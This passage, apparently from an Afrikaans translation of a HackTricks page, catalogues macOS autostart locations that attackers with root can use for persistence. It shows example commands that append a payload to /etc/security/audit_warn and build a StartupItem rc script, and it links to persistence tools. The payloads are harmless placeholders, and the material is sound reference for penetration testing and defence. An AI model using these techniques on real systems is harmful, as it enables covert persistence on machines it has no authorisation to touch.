- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
- Maar jy moet root wees, auditd moet loop en 'n waarskuwing veroorsaak
- TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/etc/security/audit_warn`**
- Root benodig
- **Trigger**: Wanneer auditd 'n waarskuwing opspoor

#### Beskrywing & Exploit

Wanneer auditd 'n waarskuwing opspoor, word die skrip **`/etc/security/audit_warn`** **uitgevoer**. So jy kan jou payload daarop voeg.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
U kan 'n waarskuwing afdwing met `sudo audit -n`.

### Opstartitems

> [!CAUTION] > **Dit is verouderd, so daar behoort niks in daardie gidse te gevind te word nie.**

Die **StartupItem** is 'n gids wat binne ofwel `/Library/StartupItems/` of `/System/Library/StartupItems/` geplaas moet word. Sodra hierdie gids gevestig is, moet dit twee spesifieke lêers insluit:

1. 'n **rc-skrip**: 'n shell-skrip wat by opstart uitgevoer word.
2. 'n **plist-lêer**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Verseker dat beide die rc-skrip en die `StartupParameters.plist`-lêer korrek binne die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan nie hierdie komponent in my macOS vind nie, so vir meer inligting, kyk na die skrywe

Skrywe: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Ingevoerd deur Apple, **emond** is 'n loggingsmeganisme wat blykbaar onderontwikkeld of moontlik verlate is, maar dit bly toeganklik. Alhoewel dit nie besonder voordelig is vir 'n Mac-administrateur nie, kan hierdie obscuure diens dien as 'n subtiele volhardingsmetode vir bedreigingsakteurs, waarskynlik onopgemerk deur die meeste macOS-administrateurs.

Vir diegene wat bewus is van sy bestaan, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsels LaunchDaemon vir hierdie diens soek na skripte om in 'n enkele gids uit te voer. Om dit te ondersoek, kan die volgende opdrag gebruik word:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root benodig
- **Trigger**: Met XQuartz

#### Beskrywing & Exploit

XQuartz is **nie meer geïnstalleer in macOS nie**, so as jy meer inligting wil hê, kyk na die skrywe.

### ~~kext~~

> [!CAUTION]
> Dit is so ingewikkeld om kext te installeer selfs as root dat ek dit nie sal oorweeg om van sandboxes te ontsnap of selfs vir volharding nie (tenzij jy 'n exploit het)

#### Ligging

Om 'n KEXT as 'n opstartitem te installeer, moet dit **in een van die volgende plekke geïnstalleer word**:

- `/System/Library/Extensions`
- KEXT-lêers ingebou in die OS X-bedryfstelsel.
- `/Library/Extensions`
- KEXT-lêers geïnstalleer deur 3de party sagteware

Jy kan tans gelaaide kext-lêers lys met:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Vir meer inligting oor [**kernels uitbreidings kyk hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Skrywe: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Ligging

- **`/usr/local/bin/amstoold`**
- Root benodig

#### Beskrywing & Exploit

Blijkbaar het die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binêre gebruik terwyl dit 'n XPC-diens blootgestel het... die ding is dat die binêre nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC-diens geroep word, sal jou binêre geroep word.

Ek kan dit nie meer in my macOS vind nie.

### ~~xsanctl~~

Skrywe: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Ligging

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root benodig
- **Trigger**: Wanneer die diens uitgevoer word (selde)

#### Beskrywing & exploit

Blijkbaar is dit nie baie algemeen om hierdie skrip uit te voer nie en ek kon dit selfs nie in my macOS vind nie, so as jy meer inligting wil hê, kyk na die skrywe.

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS weergawes nie**

Dit is ook moontlik om hier **opdragte te plaas wat by opstart uitgevoer sal word.** Voorbeeld van 'n gewone rc.common skrip:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Volhardingstegnieke en -hulpmiddels

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
